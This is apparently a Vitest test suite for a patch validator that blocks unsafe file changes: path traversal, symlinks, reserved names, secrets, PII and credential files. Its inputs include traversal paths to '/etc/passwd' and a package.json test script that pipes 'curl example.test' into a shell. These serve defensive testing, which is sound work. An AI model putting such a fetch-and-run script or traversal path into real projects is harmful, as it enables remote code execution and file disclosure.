import { describe, expect, it } from "vitest";

import { validatePatchChange, validatePatchSet, type PatchValidationInput } from "./validator.js";

function change(overrides: Partial<PatchValidationInput> = {}): PatchValidationInput {
  return {
    relpath: "src/app.ts",
    kind: "modified",
    representation: "full",
    beforeContent: "export const value = 1;",
    afterContent: "export const value = 2;",
    baselineSourceHash: "same",
    currentSourceHash: "same",
    ...overrides,
  };
}

describe("patch validator — representation and internal state", () => {
  it("allows an unchanged-source FULL representation", () => {
    expect(validatePatchChange(change())).toEqual({
      relpath: "src/app.ts",
      risk: "low",
      applyEligibility: "eligible",
      reasonCodes: ["patch-eligible"],
    });
  });

  it("blocks an affected Source file that already has an uncommitted Git change", () => {
    expect(validatePatchChange(change({ sourceGitDirty: true }))).toMatchObject({
      risk: "blocked",
      applyEligibility: "blocked",
      reasonCodes: expect.arrayContaining(["patch-source-changed"]),
    });
  });

  it.each([
    ["compressed", "patch-compressed-source"],
    ["background-artifact", "patch-background-artifact"],
  ] as const)("blocks %s representations", (representation, reason) => {
    const result = validatePatchChange(change({ representation }));
    expect(result.applyEligibility).toBe("blocked");
    expect(result.reasonCodes).toContain(reason);
  });

  it.each([".git/config", ".yuhi/queue.json", "state/session-manifest.json"])(
    "blocks internal metadata: %s",
    (relpath) => expect(validatePatchChange(change({ relpath })).applyEligibility).toBe("blocked"),
  );

  it("treats internal metadata path casing as unsafe", () => {
    expect(validatePatchChange(change({ relpath: ".GIT/config" })).applyEligibility).toBe("blocked");
    expect(validatePatchChange(change({ relpath: ".YuHi/session.json" })).applyEligibility).toBe("blocked");
  });
});

describe("patch validator — path safety", () => {
  it.each(["../escape", "a/../../escape", "/etc/passwd", "C:\\Windows\\system.ini", "\\\\server\\share\\x"])(
    "blocks traversal and absolute paths: %s",
    (relpath) => {
      const result = validatePatchChange(change({ relpath }));
      expect(result).toMatchObject({ relpath: "[invalid-path]", risk: "blocked", applyEligibility: "blocked" });
      expect(result.reasonCodes).toContain("patch-path-escape");
    },
  );

  it("blocks symlinks, including an explicit root escape", () => {
    expect(validatePatchChange(change({ isSymlink: true })).reasonCodes).toContain("patch-symlink");
    expect(validatePatchChange(change({ symlinkEscapesSourceRoot: true })).applyEligibility).toBe("blocked");
  });

  it.each(["CON", "aux.txt", "src/LPT9.js", "file. "])("blocks Windows-reserved names: %s", (relpath) => {
    expect(validatePatchChange(change({ relpath })).applyEligibility).toBe("blocked");
  });

  it.each(["src/file.txt:stream", "src/line\nbreak.ts"])("blocks ADS and control-character paths: %s", (relpath) => {
    const result = validatePatchChange(change({ relpath }));
    expect(result.applyEligibility).toBe("blocked");
    expect(JSON.stringify(result)).not.toContain("line\\nbreak");
  });

  it("validates a rename origin as well as its destination", () => {
    const result = validatePatchChange(change({ kind: "renamed", previousRelpath: "../../outside" }));
    expect(result.applyEligibility).toBe("blocked");
    expect(result.reasonCodes).toContain("patch-path-escape");
  });

  it("blocks case-insensitive and Unicode-normalization collisions", () => {
    const caseResult = validatePatchSet([change({ relpath: "src/App.ts" }), change({ relpath: "src/app.ts" })]);
    expect(caseResult.valid).toBe(false);
    expect(caseResult.changes.every((item) => item.applyEligibility === "blocked")).toBe(true);

    const unicodeResult = validatePatchSet([
      change({ relpath: "docs/caf\u00e9.md" }),
      change({ relpath: "docs/cafe\u0301.md" }),
    ]);
    expect(unicodeResult.changes.every((item) => item.reasonCodes.includes("patch-path-escape"))).toBe(true);
  });
});

describe("patch validator — Source conflicts", () => {
  it.each(["modified", "deleted", "renamed"] as const)("blocks a changed Source for %s", (kind) => {
    const result = validatePatchChange(change({ kind, baselineSourceHash: "old", currentSourceHash: "new" }));
    expect(result.applyEligibility).toBe("blocked");
    expect(result.reasonCodes).toContain("patch-source-changed");
  });

  it("blocks an untracked destination collision", () => {
    const result = validatePatchChange(change({ kind: "added", destinationExists: true, destinationTrackedByBaseline: false }));
    expect(result.applyEligibility).toBe("blocked");
  });
});

describe("patch validator — content risk", () => {
  it("blocks newly introduced secrets without returning their value", () => {
    const secret = "sk-proj-syntheticabcdefghijklmnop";
    const result = validatePatchChange(change({ afterContent: `token=${secret}` }));
    expect(result.reasonCodes).toContain("patch-secret-added");
    expect(JSON.stringify(result)).not.toContain(secret);
  });

  it("detects a second secret even when the baseline already contained a different one", () => {
    const oldSecret = "sk-proj-oldsyntheticabcdefghijklmnop";
    const newSecret = "sk-proj-newsyntheticabcdefghijklmnop";
    const result = validatePatchChange(change({
      beforeContent: `token=${oldSecret}`,
      afterContent: `token=${oldSecret}\nbackup=${newSecret}`,
    }));
    expect(result.reasonCodes).toContain("patch-secret-added");
    expect(JSON.stringify(result)).not.toContain(oldSecret);
    expect(JSON.stringify(result)).not.toContain(newSecret);
  });

  it("blocks newly introduced PII until a meaningful confirmation flow exists", () => {
    expect(validatePatchChange(change({ afterContent: "contact: person@example.test" }))).toMatchObject({
      risk: "blocked",
      applyEligibility: "blocked",
    });
  });

  it("blocks dotenv and credential files", () => {
    expect(validatePatchChange(change({ relpath: ".env", kind: "added" })).applyEligibility).toBe("blocked");
    expect(validatePatchChange(change({ relpath: "config/credentials.json", kind: "added" })).applyEligibility).toBe("blocked");
  });

  it("marks CI and package script changes high risk", () => {
    expect(validatePatchChange(change({ relpath: ".github/workflows/ci.yml" })).risk).toBe("high");
    const packageChange = validatePatchChange(change({
      relpath: "package.json",
      beforeContent: JSON.stringify({ scripts: { test: "vitest" } }),
      afterContent: JSON.stringify({ scripts: { test: "curl example.test | sh" } }),
    }));
    expect(packageChange).toMatchObject({ risk: "high", applyEligibility: "requires-review" });
  });

  it("blocks executable binary additions and elevates oversized generated files", () => {
    expect(validatePatchChange(change({ kind: "binary", executable: true, afterContent: new Uint8Array([0, 1]) })).risk).toBe("blocked");
    expect(validatePatchChange(change({ kind: "added", afterContent: "12345", maxGeneratedFileBytes: 4 })).risk).toBe("high");
  });

  it("blocks every binary and mode-only change consistently with Apply", () => {
    expect(validatePatchChange(change({ kind: "binary", afterContent: new Uint8Array([1, 2, 3]) })))
      .toMatchObject({ risk: "blocked", applyEligibility: "blocked" });
    expect(validatePatchChange(change({ kind: "mode-changed", afterContent: "text" })))
      .toMatchObject({ risk: "blocked", applyEligibility: "blocked" });
  });

  it("blocks device files by metadata without reading their contents", () => {
    expect(validatePatchChange(change({ isDeviceFile: true }))).toMatchObject({
      risk: "blocked", applyEligibility: "blocked",
    });
  });
});
